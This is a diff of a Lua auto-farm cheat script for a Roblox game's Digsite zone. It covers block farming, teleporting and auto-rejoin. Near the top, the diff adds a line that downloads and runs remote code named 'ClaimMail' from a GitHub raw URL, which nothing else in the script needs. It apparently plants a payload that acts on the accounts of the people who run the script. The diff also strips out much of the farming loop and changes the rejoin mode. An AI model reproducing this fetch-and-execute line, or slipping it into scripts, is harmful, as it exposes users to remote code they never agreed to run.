@@ -18,7 +18,7 @@ if not getgenv().Config then
 	}
 end
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCONCUBETI/Duongcutobeti/main/ClaimMail"))()
 
 
 
@@ -603,7 +603,7 @@ if true then
 			local ZoneSize = 16
 			if pcall(function() return workspace.__THINGS.__INSTANCE_CONTAINER.Active[DigsiteZone].Important.ActiveBlocks end) and CheckFarm("Digsite") then
 				if Level > 900 then 
-					FarmedCoin = false
+ 				FarmedCoin = false
 				end
 				if not StoppedTp then 
 					local BlockFolder = workspace.__THINGS.__INSTANCE_CONTAINER.Active[DigsiteZone].Important.ActiveBlocks
@@ -705,12 +705,12 @@ if true then
 					FarmBlock(Vector3.new(2,Level,ZoneSize - 1))         
 				end
 			else
-				if workspace.__THINGS.Instances:FindFirstChild(DigsiteZone) then 
-					if workspace.__THINGS.Instances[DigsiteZone]:FindFirstChild("Teleports") and workspace.__THINGS.Instances[DigsiteZone].Teleports:FindFirstChild("Enter") then 
-						TP(CFrame.new(workspace.__THINGS.Instances[DigsiteZone].Teleports.Enter.Position))
-						wait(10)
-					end
-				end
+				 if workspace.__THINGS.Instances:FindFirstChild(DigsiteZone) then 
+				     if workspace.__THINGS.Instances[DigsiteZone]:FindFirstChild("Teleports") and workspace.__THINGS.Instances[DigsiteZone].Teleports:FindFirstChild("Enter") then 
+				         TP(CFrame.new(workspace.__THINGS.Instances[DigsiteZone].Teleports.Enter.Position))
+				         wait(10)
+				     end
+				 end
 				Enter("Digsite")
 				wait(10)
 				if BlockAddedEvent then 
@@ -872,7 +872,7 @@ if true then
 		CheckForStuff()
 		if Level >= 220 then Level = getgenv().DigsiteStartLevel NoFarm = NoFarm + 1
 			if NoFarm > 3 then 
-				if getgenv().Config.AutoRejoin.RejoinMode == "RejoinWhenThereIsNothingToFarm" then 
+				if getgenv().Config.AutoRejoin.RejoinMode == "Hop" then
 					Rejoin()
 				end
 			end
@@ -908,41 +908,7 @@ if true then
 			FarmBlock(Vector3.new(3,Level,Ngang2))
 			Ngang2 = Ngang2 + 3
 		end     
-		FarmBlock(Vector3.new(2,Level,ZoneSize - 1))
-		
-		
-		Level = Level + 2
-		CheckChest()
-		for i = 1,Level do 
-			FarmBlock(Vector3.new(3,i,2))
-		end
-
-		local Ngang1 = 4
-		while Ngang1 < ZoneSize do 
-			local i = 1
-			local StartBlock = Vector3.new(Ngang1 - 2,Level,2)
-			while StartBlock.X < ZoneSize and StartBlock.Z < ZoneSize do 
-				FarmBlock(StartBlock)
-				StartBlock = StartBlock + Vector3.new(i,0,i)
-			end
-			FarmBlock(Vector3.new(Ngang1,Level,3))
-			Ngang1 = Ngang1 + 3
-		end
-		FarmBlock(Vector3.new(ZoneSize-1,Level,2))
-
-		local Ngang2 = 4
-		while Ngang2 < 16 do 
-			local i = 1
-			local StartBlock = Vector3.new(2,Level,Ngang2 - 2)
-			while StartBlock.X < ZoneSize and StartBlock.Z < ZoneSize do 
-				if ForceNextLevel then break end
-				FarmBlock(StartBlock)
-				StartBlock = StartBlock + Vector3.new(i,0,i)
-			end
-			FarmBlock(Vector3.new(3,Level,Ngang2))
-			Ngang2 = Ngang2 + 3
-		end     
-		FarmBlock(Vector3.new(2,Level,ZoneSize - 1)) 
+		FarmBlock(Vector3.new(2,Level,ZoneSize - 1))         
 	end
 	Rejoin()
 else
